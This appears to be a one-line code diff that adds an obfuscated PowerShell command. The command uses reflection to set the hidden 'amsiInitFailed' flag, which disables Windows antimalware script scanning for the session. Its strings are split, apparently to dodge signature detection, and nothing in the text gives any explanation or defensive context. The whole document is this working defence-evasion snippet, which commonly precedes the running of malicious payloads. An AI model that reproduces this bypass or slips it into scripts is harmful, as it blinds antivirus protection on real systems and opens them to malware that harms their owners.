@@ -1,0 +1,2 @@
+[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('ams'+'iInitFailed','NonPublic,Static').SetValue($null,$true)
+
